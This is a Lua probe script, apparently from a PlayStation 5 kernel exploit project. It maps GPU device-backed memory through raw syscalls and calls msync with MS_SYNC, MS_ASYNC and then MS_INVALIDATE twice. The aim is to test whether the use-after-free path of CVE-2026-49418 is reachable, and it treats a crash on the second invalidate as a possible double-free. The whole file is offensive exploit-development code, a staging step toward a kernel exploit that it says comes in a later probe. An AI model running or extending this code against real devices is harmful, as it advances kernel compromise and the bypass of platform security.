-- CRASH_CLASS: MODERATE
-- PROBE 58a: msync(MS_INVALIDATE) reachability on GPU mmap device pages
--
-- Context: CVE-2026-49418 (FreeBSD-SA-26:37.vm) describes a use-after-free
-- in the device pager page list triggered by msync(MS_INVALIDATE) on
-- device-backed mappings. GPU mmap (probe 41c) creates device-backed pages.
-- msync (syscall 65 on 13.60, kernel-dump verified) was never successfully tested — probe 42b ended at
-- the msync section header without recording a result. This probe isolates
-- msync and records its return value, survival, and post-call page state.
--
-- This probe does NOT attempt the double-free trigger (that is 58b).
-- It only tests whether msync returns, and if so, what it returns.

print("=== PROBE 58a: MSYNC REACHABILITY ON GPU MMAP ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_mmap   = make_syscall(477)  -- mmap
local sc_msync  = make_syscall(65)   -- msync (13.60 sysent: entry 65 = unique handler 0xffffffff8b478af0 containing MS_INVALIDATE branch @0x...8dee; entry 226 is a NOSYS stub)
local sc_munmap = make_syscall(73)   -- munmap
local sc_getpid = make_syscall(20)   -- getpid (canary)
local PAGE = 0x4000  -- 16 KB PS5 page size

-- msync flags (FreeBSD)
local MS_ASYNC      = 1
local MS_INVALIDATE = 2
local MS_SYNC       = 0  -- note: MS_SYNC is 0 on FreeBSD (default behavior)

--------------------------------------------------------------------
-- CANARY: verify make_syscall works
--------------------------------------------------------------------
print("--- CANARY: getpid ---")
local ok_pid, pid = pcall(function() return sc_getpid() end)
if ok_pid then
    print("  getpid: " .. tostring(to_num(pid)))
else
    print("  getpid FAILED — loader broken")
    print("=== PROBE 58a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- SECTION A: Create GPU mmap mapping (proven pattern from 41c)
--------------------------------------------------------------------
print("")
print("--- SECTION A: GPU MMAP ---")

local NUM_PAGES = 16  -- 16 pages = 256 KB, enough to test
local MAP_SIZE = NUM_PAGES * PAGE

local ok_mmap, mmap_ret = pcall(function()
    return sc_mmap(
        uint64(0),
        uint64(MAP_SIZE),
        uint64(0x33),       -- PROT_READ | PROT_WRITE | 0x30 (GPU flags)
        uint64(0x1002),     -- MAP_SHARED | MAP_ANON (device-backed)
        uint64("0xFFFFFFFFFFFFFFFF"),  -- fd = -1
        uint64(0)           -- offset = 0
    )
end)

if not ok_mmap then
    print("  mmap PCALL-FAIL")
    print("=== PROBE 58a COMPLETE ===")
    return
end

local base = to_num(mmap_ret)
local h, l = get_hi_lo(mmap_ret)
print("  mmap returned: " .. hex(mmap_ret))

if base == 0 or h >= 0xFFFF8000 then
    print("  mmap FAILED (null or kernel VA)")
    print("=== PROBE 58a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- SECTION B: Write pattern and verify (pre-msync baseline)
--------------------------------------------------------------------
print("")
print("--- SECTION B: PRE-MSYNC WRITE/READ ---")

local PATTERN = 0xCAFEBABE
local ok_w = pcall(function() memory.write_dword(base, PATTERN) end)
print("  write dword at base: " .. (ok_w and "OK" or "FAIL"))

local ok_r, val_pre = pcall(function() return memory.read_dword(base) end)
if ok_r then
    print("  read  dword at base: " .. hex(val_pre) .. (to_num(val_pre) == PATTERN and " (MATCH)" or " (MISMATCH)"))
else
    print("  read  dword at base: FAIL")
end

-- Write patterns across multiple pages
print("  Writing pattern across " .. NUM_PAGES .. " pages...")
local pages_written = 0
for i = 0, NUM_PAGES - 1 do
    local addr = base + i * PAGE
    local ok = pcall(function() memory.write_dword(addr, PATTERN + i) end)
    if ok then pages_written = pages_written + 1 end
end
print("  Pages written: " .. pages_written .. "/" .. NUM_PAGES)

--------------------------------------------------------------------
-- SECTION C: msync with MS_SYNC (safe baseline — does NOT invalidate)
--------------------------------------------------------------------
print("")
print("--- SECTION C: MSYNC MS_SYNC (SAFE BASELINE) ---")
print("  BEFORE msync(MS_SYNC)")

local ok_sync, ret_sync = pcall(function()
    return sc_msync(
        uint64(base),
        uint64(MAP_SIZE),
        uint64(MS_SYNC)  -- 0 on FreeBSD = synchronous writeback
    )
end)

if ok_sync then
    print("  RETURNED: ret=" .. tostring(to_num(ret_sync)))
else
    print("  PCALL-FAIL — msync(MS_SYNC) killed process or threw")
    print("=== PROBE 58a COMPLETE ===")
    return
end

-- Verify pages still readable after MS_SYNC
local ok_post_sync, val_post_sync = pcall(function() return memory.read_dword(base) end)
if ok_post_sync then
    print("  post-sync read: " .. hex(val_post_sync) .. (to_num(val_post_sync) == PATTERN and " (MATCH)" or " (CHANGED)"))
else
    print("  post-sync read: FAIL")
end

--------------------------------------------------------------------
-- SECTION D: msync with MS_ASYNC
--------------------------------------------------------------------
print("")
print("--- SECTION D: MSYNC MS_ASYNC ---")
print("  BEFORE msync(MS_ASYNC)")

local ok_async, ret_async = pcall(function()
    return sc_msync(
        uint64(base),
        uint64(MAP_SIZE),
        uint64(MS_ASYNC)  -- 1
    )
end)

if ok_async then
    print("  RETURNED: ret=" .. tostring(to_num(ret_async)))
else
    print("  PCALL-FAIL — msync(MS_ASYNC) killed process or threw")
    print("=== PROBE 58a COMPLETE ===")
    return
end

-- Verify pages still readable
local ok_post_async, val_post_async = pcall(function() return memory.read_dword(base) end)
if ok_post_async then
    print("  post-async read: " .. hex(val_post_async) .. (to_num(val_post_async) == PATTERN and " (MATCH)" or " (CHANGED)"))
else
    print("  post-async read: FAIL")
end

--------------------------------------------------------------------
-- SECTION E: msync with MS_INVALIDATE (THE CVE-2026-49418 PATH)
--------------------------------------------------------------------
print("")
print("--- SECTION E: MSYNC MS_INVALIDATE (CVE PATH) ---")
print("  BEFORE msync(MS_INVALIDATE)")
print("  base=" .. hex(mmap_ret) .. " size=" .. hex(MAP_SIZE))

local ok_inv, ret_inv = pcall(function()
    return sc_msync(
        uint64(base),
        uint64(MAP_SIZE),
        uint64(MS_INVALIDATE)  -- 2
    )
end)

if ok_inv then
    print("  RETURNED: ret=" .. tostring(to_num(ret_inv)))
    print("  >>> MSYNC MS_INVALIDATE SURVIVED <<<")
else
    print("  PCALL-FAIL — msync(MS_INVALIDATE) killed process or threw")
    print("  >>> MSYNC MS_INVALIDATE IS LETHAL OR BLOCKED <<<")
    print("=== PROBE 58a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- SECTION F: Post-invalidate page state
--------------------------------------------------------------------
print("")
print("--- SECTION F: POST-INVALIDATE PAGE STATE ---")

-- Try reading each page after invalidation
local pages_readable = 0
local pages_changed = 0
local pages_faulted = 0
for i = 0, NUM_PAGES - 1 do
    local addr = base + i * PAGE
    local ok_rd, val = pcall(function() return memory.read_dword(addr) end)
    if ok_rd then
        pages_readable = pages_readable + 1
        local v = to_num(val)
        local expected = PATTERN + i
        if v ~= expected then
            pages_changed = pages_changed + 1
            if i < 4 then  -- only print first few
                print("  page " .. i .. ": CHANGED " .. hex(expected) .. " -> " .. hex(val))
            end
        end
    else
        pages_faulted = pages_faulted + 1
        if i < 4 then
            print("  page " .. i .. ": FAULT (re-inserted page fault)")
        end
    end
end
print("  readable: " .. pages_readable .. "/" .. NUM_PAGES)
print("  changed:  " .. pages_changed .. "/" .. NUM_PAGES)
print("  faulted:  " .. pages_faulted .. "/" .. NUM_PAGES)

if pages_faulted > 0 then
    print("  >>> PAGE FAULTS AFTER INVALIDATE — CVE TRIGGER PATH MAY BE REACHABLE <<<")
end
if pages_readable == NUM_PAGES and pages_changed == 0 then
    print("  >>> PAGES UNCHANGED — invalidate may be a no-op on this device type <<<")
end

--------------------------------------------------------------------
-- SECTION G: Second msync MS_INVALIDATE (double-invalidate test)
--------------------------------------------------------------------
print("")
print("--- SECTION G: SECOND MSYNC MS_INVALIDATE ---")
print("  BEFORE second msync(MS_INVALIDATE)")

local ok_inv2, ret_inv2 = pcall(function()
    return sc_msync(
        uint64(base),
        uint64(MAP_SIZE),
        uint64(MS_INVALIDATE)
    )
end)

if ok_inv2 then
    print("  RETURNED: ret=" .. tostring(to_num(ret_inv2)))
    print("  >>> DOUBLE INVALIDATE SURVIVED <<<")
else
    print("  PCALL-FAIL — second msync(MS_INVALIDATE) killed or threw")
    print("  >>> SECOND INVALIDATE IS LETHAL — possible double-free crash <<<")
end

--------------------------------------------------------------------
-- SECTION H: Cleanup canary
--------------------------------------------------------------------
print("")
print("--- SECTION H: CLEANUP ---")
local ok_pid2, pid2 = pcall(function() return sc_getpid() end)
if ok_pid2 then
    print("  getpid post-test: " .. tostring(to_num(pid2)))
    print("  Process survived all msync calls")
else
    print("  getpid FAILED — process state may be corrupted")
end

-- Attempt munmap
local ok_unmap, ret_unmap = pcall(function()
    return sc_munmap(uint64(base), uint64(MAP_SIZE))
end)
if ok_unmap then
    print("  munmap: ret=" .. tostring(to_num(ret_unmap)))
else
    print("  munmap: PCALL-FAIL")
end

print("")
print("=== PROBE 58a COMPLETE ===")
